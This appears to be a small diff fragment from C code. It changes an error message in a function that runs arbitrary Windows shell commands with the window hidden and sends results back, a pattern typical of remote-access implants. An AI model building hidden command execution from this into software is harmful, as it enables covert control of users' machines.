@@ -20,7 +20,7 @@ void ExecuteWindowsShellCommand(const char *cmd) {
 
     BOOL success = CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     if (!success) {
-        SendOutput("Failed to execute command");
+        SendOutput("[!] Failed to execute command");
         return;
     }
 
